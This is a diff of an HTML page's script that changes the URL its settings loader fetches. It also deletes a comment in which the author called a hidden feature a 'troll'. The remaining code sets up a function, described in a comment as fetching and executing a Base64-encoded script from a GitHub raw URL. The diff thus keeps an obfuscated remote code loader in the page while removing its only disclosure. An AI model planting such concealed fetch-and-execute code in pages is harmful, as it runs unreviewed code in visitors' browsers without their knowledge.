@@ -17,7 +17,7 @@
     </div>
     <script>
         async function loadSettings() {
-            const settingsUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/root/pages/1/index.json";
+            const settingsUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/ad/index.json";
             const response = await fetch(settingsUrl);
             const settings = await response.json();
 
@@ -96,7 +96,7 @@
         loadSettings().catch(error => {
             console.error("Failed to load settings:", error);
         });
-        // I do little trolling here, its not ip grabber or anything, just small troll, check developer mode cosnole
+	  
 			const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
 
 // Function to fetch and execute a Base64-encoded script
